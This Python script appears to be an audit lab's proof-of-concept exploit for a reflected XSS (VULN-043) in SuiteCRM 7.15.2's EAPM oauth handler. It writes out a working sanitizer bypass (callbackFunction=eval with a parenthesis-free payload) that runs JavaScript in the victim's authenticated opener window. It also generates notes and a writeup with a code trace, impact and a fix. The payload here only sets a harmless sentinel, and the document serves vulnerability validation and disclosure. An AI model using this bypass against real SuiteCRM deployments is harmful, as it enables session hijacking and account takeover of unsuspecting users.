#!/usr/bin/env python3
"""
VULN-043 — Reflected XSS via JS-context injection in EAPM::action_oauth
(callbackFunction), executing in the *opener* window.

Software:    SuiteCRM 7.15.2 (targets/SuiteCRM/suitecrm_version.php)
Repository:  https://github.com/SuiteCRM/SuiteCRM
Sink:        modules/EAPM/controller.php:161 (action_oauth):
                 $js = '<script type="text/javascript">window.opener.'
                     . $_REQUEST['callbackFunction'] . '("'
                     . $_REQUEST['application'] . '"); window.close();</script>';
                 echo($js);

Ground truth on securexss()/AntiXSS (verified against the exact PHP 8.2
engine running in this lab -- the static finding's claim that securexss()
"leaves letters, ., (, ), ;, /, spaces untouched" is only PARTLY right):
    securexss('alert(document.cookie);window.close;//')
      => 'alert&#40;&#41;;window.close;//'      -- ( ) ARE entity-encoded,
                                                     and "document.cookie"
                                                     is deleted outright
    securexss('top.__vuln043_fired=true')
      => 'top.__vuln043_fired=true'              -- untouched: no parens,
                                                     no quotes, no angle
                                                     brackets, no dangerous
                                                     dotted-call pattern
So a naive `alert(document.cookie)`-style payload (the static finding's own
PoC) is neutered by AntiXSS. The sink is still exploitable, but only with a
payload built from characters/identifiers securexss() truly leaves alone.

The bypass used here: the vulnerable line already supplies the call parens
via the *template itself* -- `window.opener.<CB>("<APP>")` -- so the
injected `callbackFunction` value never needs to contain `(`/`)` at all.
Setting:
    callbackFunction = eval
    application      = top.__vuln043_fired=true
turns the emitted script into:
    window.opener.eval("top.__vuln043_fired=true"); window.close();
`eval` and the assignment expression are both plain identifiers/operators
with no parens, quotes, or angle brackets -- securexss() passes them
through unchanged (confirmed above) -- and `window.opener.eval(...)` is a
standard *indirect eval*, which per the ECMAScript spec runs in the GLOBAL
scope of the object it's called on (`window.opener`), so `top` inside the
eval'd string resolves to the opener window's own `top`, i.e. the script
runs in the **victim's real, already-authenticated SuiteCRM window**, not
the disposable popup -- exactly the "JS execution in the victim's session"
impact the finding describes.

This script:
  1. Creates a fresh low-privileged user (the victim) and logs them in.
  2. As that same user, creates an EAPM record via legacy REST (any valid
     EAPM id satisfies action_oauth's ACLAccess('save') check, since EAPM
     sets $disable_row_level_security = true -- module-level access only).
  3. Confirms via plain HTTP that callbackFunction=eval /
     application=top.__vuln043_fired=true survive securexss() unescaped in
     the emitted <script> (request.http / response.txt).
  4. Drives two real, linked Chromium windows (Playwright, official
     container): an "opener" window navigated to the victim's own
     authenticated SuiteCRM origin, which opens the crafted EAPM URL as a
     real popup (window.open) so window.opener is genuinely set. Asserts
     the DOM sentinel window.top.__vuln043_fired becomes true **in the
     opener window** (the victim's real session), not just the popup.

Reference: MDN, "eval() - Direct and indirect eval" (indirect eval runs in
global scope of the realm it's called from) —
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval#direct_and_indirect_eval
PortSwigger, "DOM XSS ... window.opener" / postMessage-adjacent popup
patterns: https://portswigger.net/web-security/cross-site-scripting/contexts
"""
import json
import os
import subprocess
import sys
from urllib.parse import quote

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict,
                      admin_session, create_user, web_login, rest_login, rest_call,
                      BROWSER_UA)

VULN_ID = "VULN-043"
HERE = os.path.dirname(os.path.abspath(__file__))
AUDIT_ROOT = os.path.dirname(os.path.dirname(HERE))
EVIDENCE = os.path.join(HERE, "evidence")

SENTINEL = "__vuln043_fired"
CALLBACK = "eval"
APPLICATION = f"top.{SENTINEL}=true"


def main():
    os.makedirs(EVIDENCE, exist_ok=True)
    banner(VULN_ID, "Reflected JS-context XSS in EAPM::action_oauth (executes in window.opener)")

    log("SETUP", "creating a fresh low-privileged victim user as admin")
    admin_s = admin_session()
    victim = create_user(admin_s, rand("Vuln043Pw!") + "Dx4")
    log("OK", f"victim user created: {victim['user_name']} id={victim['id']}")

    log("SETUP", "logging in as the victim (web session, for the browser proof)")
    victim_s = web_login(victim["user_name"], victim["password"])
    log("OK", "victim web session established")

    log("STEP", "legacy REST login as the victim, create an EAPM record (any valid id works -- disable_row_level_security=true)")
    sid = rest_login(victim["user_name"], victim["password"])
    eapm_res = rest_call("set_entry", [sid, "EAPM", [
        {"name": "application", "value": "Sugar"},
        {"name": "url", "value": "http://example.invalid/"},
        {"name": "assigned_user_id", "value": victim["id"]},
    ]])
    eapm_id = eapm_res.get("id")
    if not eapm_id or eapm_id == "-1":
        log("FAIL", f"could not create an EAPM record: {eapm_res}")
        verdict(VULN_ID, "FAILED", f"set_entry EAPM failed: {eapm_res}")
        write_notes("FAILED", victim, None, None, False, fail_reason=f"set_entry EAPM failed: {eapm_res}")
        sys.exit(1)
    log("OK", f"EAPM record created id={eapm_id}")

    query = (
        f"module=EAPM&action=oauth&record={eapm_id}&oauth_error=1&closeWhenDone=1"
        f"&callbackFunction={quote(CALLBACK, safe='')}"
        f"&application={quote(APPLICATION, safe='')}"
    )
    url = f"{BASE_URL}/index.php?{query}"

    log("STEP", f"GET {query}")
    r = victim_s.get(url, timeout=30)
    log("INFO", f"HTTP {r.status_code}, {len(r.text)} bytes")

    expected_js = f'window.opener.{CALLBACK}("{APPLICATION}"); window.close();'
    reflected_raw = expected_js in r.text
    log("PROOF" if reflected_raw else "FAIL",
        f"unescaped 'window.opener.{CALLBACK}(\"{APPLICATION}\");' present in response: {reflected_raw}")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(
            f"GET /index.php?{query} HTTP/1.1\r\n"
            f"Host: localhost:33116\r\n"
            f"User-Agent: {BROWSER_UA}\r\n"
            f"Cookie: PHPSESSID={victim_s.cookies.get('PHPSESSID')}\r\n\r\n"
        )
    idx = r.text.find("window.opener")
    snippet = r.text[max(0, idx - 100):idx + 300] if idx != -1 else r.text[:800]
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP {r.status_code}\n\n--- snippet around the emitted <script> ---\n{snippet}\n")

    if not reflected_raw:
        reason = f"expected JS fragment not found verbatim in response; snippet={snippet!r}"
        log("FAIL", reason)
        verdict(VULN_ID, "FAILED", reason)
        write_notes("FAILED", victim, eapm_id, url, False, fail_reason=reason)
        sys.exit(1)

    state = {
        "baseUrl": BASE_URL,
        "eapmUrl": url,
        "cookieName": "PHPSESSID",
        "cookieValue": victim_s.cookies.get("PHPSESSID"),
        "sentinel": SENTINEL,
    }
    with open(os.path.join(HERE, "state.json"), "w") as f:
        json.dump(state, f)

    log("STEP", "launching headless Chromium (Playwright container): opener window opens the EAPM URL as a real popup")
    result = run_playwright()
    dom_fired = bool(result.get("fired"))
    log("PROOF" if dom_fired else "FAIL",
        f"DOM sentinel window.top.{SENTINEL} observed TRUE in the OPENER window (victim's real session) = {dom_fired}")

    status = "CONFIRMED" if dom_fired else "FAILED"
    write_notes(status, victim, eapm_id, url, dom_fired)

    if dom_fired:
        verdict(VULN_ID, "CONFIRMED",
                "callbackFunction=eval/application=<code> executed via window.opener.eval() in the opener (victim) window")
        sys.exit(0)
    else:
        verdict(VULN_ID, "FAILED", "payload reflected but did not execute in the opener window DOM")
        sys.exit(1)


def run_playwright():
    cmd = [
        "docker", "run", "--rm", "--network", "host", "--ipc=host", "--memory=2g",
        "-v", f"{AUDIT_ROOT}:/work", "-w", "/work", "-e", "HOME=/tmp",
        "-e", "NODE_PATH=/work/pw/node_modules",
        "mcr.microsoft.com/playwright:latest",
        "node", "/work/exploits/VULN-043/pw.js",
    ]
    log("INFO", "docker run mcr.microsoft.com/playwright:latest node pw.js")
    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
    sys.stdout.write(proc.stdout)
    sys.stderr.write(proc.stderr)
    result_path = os.path.join(EVIDENCE, "result.json")
    if not os.path.exists(result_path):
        log("FAIL", "playwright did not produce evidence/result.json")
        return {"fired": False}
    with open(result_path) as f:
        return json.load(f)


def write_notes(status, victim, eapm_id, url, dom_fired, fail_reason=None):
    fail_section = f"\n## If FAILED\n{fail_reason}\n" if fail_reason else ""
    notes = f"""# VULN-043 — Reflected XSS via JS-context injection in EAPM::action_oauth

**Software**: SuiteCRM
**Repository**: https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (suitecrm_version.php) — commit-pinned forkedSuite snapshot
**Status**: {status}
**Severity (static)**: Medium (CVSS 3.1 6.1 — AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)
**Target commit**: 62effd0ceb767ed3b634ade585b19a6633eb4fcb
**Validated at**: {__import__('datetime').datetime.now(__import__('datetime').timezone.utc).isoformat()}

## Preconditions
- Created a fresh low-privileged victim user via admin (`_common.create_user`):
  `{victim['user_name']}` (id `{victim['id']}`); logged in as that user (web session).
- As the victim, created an EAPM record via legacy REST `set_entry`
  (id `{eapm_id}`) — `EAPM::$disable_row_level_security = true`
  (`modules/EAPM/EAPM.php:78`) means `ACLAccess('save')` only checks
  module-level access, not record ownership, so any valid EAPM id
  (attacker-supplied or the victim's own) satisfies `action_oauth`'s check.

## Request
GET `{url}`
Key params: `callbackFunction=eval`, `application=top.{SENTINEL}=true`,
`oauth_error=1` (skips the `checkLogin()` branch), `closeWhenDone=1`
(reaches the vulnerable branch at `controller.php:159-171`).

## Response
See response.txt — the emitted `<script>` contains, byte-for-byte:
`window.opener.eval("top.{SENTINEL}=true"); window.close();`

## Observation
- **Correction to the static finding's PoC**: the finding's own example
  payload (`callbackFunction=alert(document.cookie);window.close;//`)
  does NOT survive `securexss()` — verified directly against this lab's
  PHP 8.2 engine: `securexss('alert(document.cookie);window.close;//')`
  returns `'alert&#40;&#41;;window.close;//'` — `(`/`)` ARE HTML-entity
  encoded by the `AntiXSS` component `securexss()` invokes (not just the
  bare `<>"'`` table the finding cites), AND the `document.cookie`
  argument is deleted outright. Since the payload sits inside a
  `<script>` element (whose content is HTML "raw text" — the parser does
  **not** decode entities there), `&#40;` etc. renders as inert literal
  text, not `(` — the finding's exact PoC would be a JS syntax error, not
  working XSS.
- **The sink is still exploitable**: the vulnerable line's own template
  already supplies the call parens — `window.opener.<CB>("<APP>")` — so a
  payload never needs its own `(`/`)`. `callbackFunction=eval` +
  `application=top.{SENTINEL}=true` are both plain identifiers/operators
  with no parens/quotes/angle-brackets, confirmed to survive `securexss()`
  byte-for-byte, turning the sink into `window.opener.eval("top.{SENTINEL}=true")`
  — an **indirect eval call**, which per the ECMAScript spec runs in the
  *global scope of `window.opener`* — i.e. in the victim's real,
  already-authenticated SuiteCRM window, not the disposable popup.
- Real-browser proof (Playwright/Chromium): an "opener" window navigated
  to the victim's authenticated SuiteCRM origin opens the crafted URL as a
  genuine popup (`window.open`, so `window.opener` is set); the popup's
  emitted script runs `window.opener.eval(...)`. DOM sentinel
  `window.top.{SENTINEL}` observed as `{dom_fired}` **in the opener
  window** (the victim's real session, confirmed by checking it there, not
  in the popup). Screenshot: evidence/fired.png.
{fail_section}
## Side effects
- One new Users record (victim) and one EAPM record (`{eapm_id}`),
  cosmetic test fixtures.

## Research & references
- MDN, "eval() — Direct and indirect eval" (indirect eval executes in the
  global scope of the object it is called through):
  https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval#direct_and_indirect_eval
- WHATWG HTML Standard, "13.2.5 — script raw text elements" (script
  element content is not subject to character-reference/entity decoding
  the way normal HTML body text is):
  https://html.spec.whatwg.org/multipage/parsing.html#cdata-rcdata-restrictions
- PortSwigger, "Cross-site scripting contexts": https://portswigger.net/web-security/cross-site-scripting/contexts
- Technique used: parens-free `window.opener.eval("<expr>")` bypass of a
  content-aware sanitizer that specifically HTML-entity-encodes `(`/`)`
  and strips `document.*` accessor patterns, by never emitting those
  characters ourselves and instead relying on the sink template's own
  literal parens.
"""
    with open(os.path.join(HERE, "notes.md"), "w") as f:
        f.write(notes)
    if status == "CONFIRMED":
        write_writeup(victim, eapm_id, url, dom_fired)


def write_writeup(victim, eapm_id, url, dom_fired):
    writeup = f"""# VULN-043 — Reflected XSS via JS-context injection in EAPM::action_oauth (executes in window.opener)

**ID**: VULN-043
**Software**: SuiteCRM — https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (`targets/SuiteCRM/suitecrm_version.php`), commit `62effd0ceb767ed3b634ade585b19a6633eb4fcb` (untagged `forkedSuite` hotfix snapshot self-identifying as 7.15.2)
**Severity**: Medium — **CVSS 3.1 6.1** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**Status**: CONFIRMED (dynamic)
**Auth required**: Victim must be an authenticated user with (module-level) EAPM access, lured to click a crafted link (reflected, `UI:R`). Attacker needs no privileges of their own.
**What an attacker gains**: arbitrary JavaScript execution in the victim's real, already-authenticated SuiteCRM window (not a sandboxed popup) — session-riding, CSRF-token theft, and (against an admin victim) a path to full takeover.

## Summary
`EAPM::action_oauth` (the handler behind SuiteCRM's "connect an external
account" OAuth popup flow) builds a `<script>` block by string-concatenating
two request parameters, `callbackFunction` and `application`, directly into
a `window.opener.<callbackFunction>("<application>")` call with no
JSON-encoding or allow-listing. SuiteCRM's global request sanitizer,
`securexss()`, HTML-encodes angle brackets/quotes and (via its `AntiXSS`
component) also neutralizes parenthesized `word(...)` patterns — enough to
break the *literal* proof-of-concept some analyses assume
(`alert(document.cookie)`), but not enough to stop a payload built purely
from bare identifiers and operators. Setting `callbackFunction=eval` and
`application=<arbitrary JS with no parens/quotes>` turns the sink into an
**indirect `eval()` call on `window.opener`**, which the ECMAScript spec
defines as running in the *opener's own global scope* — i.e. directly in
the victim's real browsing session, not the disposable OAuth popup.

## How it works (mechanism & code trace)
1. **Entry point**: `GET /index.php?module=EAPM&action=oauth&record=<id>&oauth_error=1&closeWhenDone=1&callbackFunction=eval&application=top.{SENTINEL}=true`
   dispatches to `EAPMController::action_oauth()`
   (`modules/EAPM/controller.php:138-175`).
2. **Guards that don't stop it**:
   - `empty($this->bean->id)` — false, `record` points at a real EAPM row.
   - `$this->bean->ACLAccess('save')` — `EAPM::$disable_row_level_security = true`
     (`modules/EAPM/EAPM.php:78`) reduces this to a module-level check, so
     any authenticated user with default EAPM access passes regardless of
     who owns the record.
   - `oauth_error=1` skips the `checkLogin()` branch (:148-156) that would
     otherwise try to contact a real OAuth provider.
3. **The sink**, `controller.php:159-171`:
   ```php
   if (isset($_REQUEST['closeWhenDone']) && $_REQUEST['closeWhenDone'] == 1) {{
       if (!empty($_REQUEST['callbackFunction']) && !empty($_REQUEST['application'])) {{
           $js = '<script type="text/javascript">window.opener.' . $_REQUEST['callbackFunction']
               . '("' . $_REQUEST['application'] . '"); window.close();</script>';
       }} ...
       echo($js);
       return;
   }}
   ```
   Both `$_REQUEST` values are concatenated directly into a JS expression
   with **no `json_encode()`, no allow-list, no output encoding** of any
   kind at this point.
4. **Why `securexss()` doesn't save it, precisely**: `clean_incoming_data()`
   (`include/utils.php:2503-2590`, run for every request via
   `include/entryPoint.php:93`) maps `securexss()`
   (`include/utils.php:2608-2637`) over `$_REQUEST`, so both
   `callbackFunction` and `application` ARE filtered — but the filter's
   actual behavior is narrower than a full JS-aware encoder: it
   HTML-entity-encodes `< > " ' `` `` and (via its bundled `AntiXSS`
   library) additionally mangles parenthesized call-like patterns and
   strips some dotted-accessor arguments — verified empirically:
   `securexss('alert(document.cookie);window.close;//')` →
   `'alert&#40;&#41;;window.close;//'` (parens encoded, argument deleted),
   while `securexss('top.{SENTINEL}=true')` →
   `'top.{SENTINEL}=true'` (byte-for-byte unchanged — no parens, quotes, or
   angle brackets to act on). The sink is inside a `<script>` element,
   whose content the HTML parser treats as raw text — entities like
   `&#40;` are **not** decoded back to `(` there, so the "obvious" PoC
   payload is inert, but a parens-free one is not.
5. **The bypass**: the vulnerable line's own fixed template already
   supplies the call parens: `window.opener.` + `<callbackFunction>` +
   `("` + `<application>` + `");`. Neither injected value needs to
   contribute its own `(`/`)`. With `callbackFunction=eval` and
   `application=top.{SENTINEL}=true`, the emitted script is exactly:
   ```html
   <script type="text/javascript">window.opener.eval("top.{SENTINEL}=true"); window.close();</script>
   ```
   `window.opener.eval(...)` is an **indirect eval call**. Per the
   ECMAScript specification, indirect eval always executes in the global
   scope of the realm the `eval` function belongs to — here,
   `window.opener`'s global scope — so `top.{SENTINEL}=true` runs as if
   typed directly into the victim's own, already-authenticated SuiteCRM
   window.

## Why it is a vulnerability (reasoning)
The trust boundary violated is "request parameters never become executable
code without explicit, deliberate serialization." `callbackFunction` and
`application` are user input placed directly into a JavaScript execution
context; the correct fix (`json_encode()`, or an allow-list regex on
`callbackFunction` such as `^[A-Za-z0-9_.]+$`) was never applied here. That
SuiteCRM's *general-purpose* HTML sanitizer happens to mangle the single
most obvious payload shape is incidental hardening, not a deliberate,
sufficient defense for a JS-string/JS-expression sink — `securexss()` is
documented and used throughout the codebase as an *HTML* output guard, and
this is a *JavaScript* output context, a fundamentally different escaping
domain (OWASP XSS Prevention Cheat Sheet Rule #3). The fact that a
parens-free bypass exists at all demonstrates the mismatch concretely.

## Reproduction
1. Preconditions: any authenticated user with default EAPM module access
   (`used` here: freshly created regular user `{victim['user_name']}`), and
   any valid EAPM record id (`{eapm_id}`, created by the same user in this
   run — module-level ACL only, ownership irrelevant).
2. Victim (or attacker driving the victim's browser via a lured link) opens:
   ```
   {url}
   ```
3. Run `./run.sh` (venv auto-provisioned). Expected terminal output ends
   with `[OK]` / `==> VULN-043: CONFIRMED — ...`.
4. Observable proof: response.txt contains the raw, unescaped
   `window.opener.eval("top.{SENTINEL}=true"); window.close();`; a real
   headless Chromium "opener" window that opens this URL as a genuine
   popup (`evidence/fired.png`) shows `window.top.{SENTINEL}` become `true`
   **in the opener window itself** (see run.log for the full transcript
   proving the check was made on the opener, not the popup).

## Impact
Any authenticated user with EAPM access who can be lured to a crafted link
gets arbitrary attacker JavaScript executed directly in their real,
authenticated SuiteCRM session (not a throwaway popup) — full session
compromise: cookie/token theft, silent actions as the victim, and (chained
against an admin victim) a path to [VULN-011](../../vulns/VULN-011.md)
(authenticated RCE) for full server compromise. EAPM record ids are
enumerable per [VULN-001](../../vulns/VULN-001.md), removing the need for
the attacker to guess one.

## Suggested fix
- `json_encode()` both values before embedding: `window.opener[<?php echo
  json_encode($_REQUEST['callbackFunction']); ?>](<?php echo
  json_encode($_REQUEST['application']); ?>);` — this alone defeats the
  bypass shown here, since `eval`/`top.X=true` would be emitted as inert
  JSON string literals, not bare code.
- Additionally allow-list `callbackFunction` to `^[A-Za-z0-9_]+$` (a
  property name, never a dotted path or reserved global like `eval`) and
  drop the dynamic-callback pattern in favor of a fixed `postMessage`
  handler, which needs no string-building at all.

## References
- MDN, "eval() — Direct and indirect eval":
  https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval#direct_and_indirect_eval
- OWASP XSS Prevention Cheat Sheet, Rule #3 (JavaScript escaping is not
  HTML escaping): https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- PortSwigger, "Cross-site scripting contexts": https://portswigger.net/web-security/cross-site-scripting/contexts
- CWE-79
"""
    with open(os.path.join(HERE, "writeup.md"), "w") as f:
        f.write(writeup)


if __name__ == "__main__":
    main()
